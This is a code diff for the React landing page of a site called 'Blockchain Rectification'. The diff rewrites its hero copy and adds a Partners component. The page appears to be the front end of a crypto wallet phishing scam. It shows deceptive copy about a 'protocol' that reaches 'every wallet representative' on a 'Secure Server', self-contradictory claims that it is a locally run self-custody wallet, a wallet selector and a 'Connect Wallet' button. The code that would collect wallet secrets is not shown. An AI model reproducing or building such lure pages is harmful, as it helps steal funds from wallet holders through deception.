@@ -12,7 +12,8 @@ import CryptoCarousel from "./cryptocarousel";
 import { wallets } from "./utility/wallets";
 import HomeFooter from "./Homefooter";
 import Cryptowallet from "./assets/Cryptowallet.png";
-import Heroimg from "./assets/heroimg.png";
+//import Heroimg from "./assets/heroimg.png";
+import Partners from "./components/partners";
 
 const theme = createTheme({
   typography: {
@@ -122,16 +123,16 @@ function App() {
           }}
         >
           <Box
-  sx={{
-    textAlign: "center",
-    maxWidth: 800,
-    width: "100%",
-    px: 2,
-    mt: { xs: 7, md: 5 },
-    position: "relative",
-  }}
->
-  {/* <img
+            sx={{
+              textAlign: "center",
+              maxWidth: 800,
+              width: "100%",
+              px: 2,
+              mt: { xs: 7, md: 5 },
+              position: "relative",
+            }}
+          >
+            {/* <img
     src={Heroimg}
     alt="Top Left"
     style={{
@@ -155,79 +156,77 @@ function App() {
       display: { xs: "none", md: "block" }, // Hide on small screens
     }}
   /> */}
-  <Typography
-    variant="h1"
-    sx={{
-      fontSize: { xs: "3.5rem", sm: "5rem", md: "8rem" },
-      lineHeight: { xs: 1.2, sm: 1.1, md: 1 },
-    }}
-  >
-    Blockchain Rectification
-  </Typography>
-  <Typography variant="body1" sx={{ mb: 2 }}>
-    Every digital artwork on Upside is authentic and truly unique.
-  </Typography>
-  <Typography variant="body1" sx={{ mb: 2 }}>
-    Blockchain technology makes this new approach to digital ownership
-    possible. Open and decentralized protocol for syncing various
-    Wallets issues on Secure Server.
-  </Typography>
-  <Typography variant="body1" sx={{ mb: 2 }}>
-    This is not an app but a protocol that establishes a remote
-    resolution between all noncustodial wallet It is an online server
-    which gets you across to every wallet representative to enable
-    effective complain and rectification of issues.
-  </Typography>
-  <Typography
-    variant="body1"
-    sx={{
-      mb: 2,
-      color: "#3498db",
-      fontWeight: "bold",
-    }}
-  >
-    You will be on a chat with an Artificial Intelligence Robot with
-    zero Human interference.
-  </Typography>
-  <Stack
-    direction={{ xs: "column", sm: "row" }}
-    spacing={{ xs: 2, sm: 2 }}
-    justifyContent="center"
-    sx={{ mt: 4 }}
-  >
-    <SelectMinimal
-      value={selectedWallet ? selectedWallet.id : ""}
-      onChange={handleWalletChange}
-      menuItems={wallets.map((wallet) => ({
-        value: wallet.id,
-        label: wallet.name,
-      }))}
-      sx={{
-        minWidth: { xs: "100%", sm: "auto" },
-        "& .MuiSelect-select": {
-          fontSize: { xs: "0.8rem", sm: "0.9rem" },
-        },
-      }}
-    />
-    <StyledButton onClick={handleConnectWallet}>
-      <Typography
-        variant="caption"
-        noWrap
-        sx={{
-          color: "white",
-          fontSize: "15px",
-          textTransform: "capitalize",
-        }}
-      >
-        Connect Wallet
-      </Typography>
-    </StyledButton>
-  </Stack>
-</Box>
-
-
+            <Typography
+              variant="h1"
+              sx={{
+                mt: { md: 5 },
+                fontSize: { xs: "3.3rem", sm: "5rem", md: "8rem" },
+                lineHeight: { xs: 1.2, sm: 1.1, md: 1 },
+              }}
+            >
+              Blockchain Rectification
+            </Typography>
+            <Typography variant="body1" sx={{ mb: 2 }}>
+              Blockchain technology makes this new approach to digital ownership
+              possible. Open and decentralized protocol for syncing various
+              Wallets issues on Secure Server.
+            </Typography>
+            <Typography variant="body1" sx={{ mb: 2 }}>
+              This is not an app but a protocol that establishes a remote
+              resolution between all noncustodial wallet. It is an online server
+              which gets you across to every wallet representative to enable
+              effective complain and rectification of issues.
+            </Typography>
+            <Typography
+              variant="body1"
+              sx={{
+                mb: 2,
+                color: "#3498db",
+                fontWeight: "bold",
+              }}
+            >
+              This is a self-custody crypto wallet that supports 50+ crypto
+              networks with unlimited token support on the most popular web3
+              networks. No account sign-up is required because it all runs
+              locally on your device.
+            </Typography>
+            <Stack
+              direction={{ xs: "column", sm: "row" }}
+              spacing={{ xs: 2, sm: 2 }}
+              justifyContent="center"
+              sx={{ mt: 4 }}
+            >
+              <SelectMinimal
+                value={selectedWallet ? selectedWallet.id : ""}
+                onChange={handleWalletChange}
+                menuItems={wallets.map((wallet) => ({
+                  value: wallet.id,
+                  label: wallet.name,
+                }))}
+                sx={{
+                  minWidth: { xs: "100%", sm: "auto" },
+                  "& .MuiSelect-select": {
+                    fontSize: { xs: "0.8rem", sm: "0.9rem" },
+                  },
+                }}
+              />
+              <StyledButton onClick={handleConnectWallet}>
+                <Typography
+                  variant="caption"
+                  noWrap
+                  sx={{
+                    color: "white",
+                    fontSize: "15px",
+                    textTransform: "capitalize",
+                  }}
+                >
+                  Connect Wallet
+                </Typography>
+              </StyledButton>
+            </Stack>
+          </Box>
+          <Partners />
           <Categories />
-
           <WalletbaseModal
             open={openWalletbaseModal}
             onClose={handleCloseWalletbaseModal}
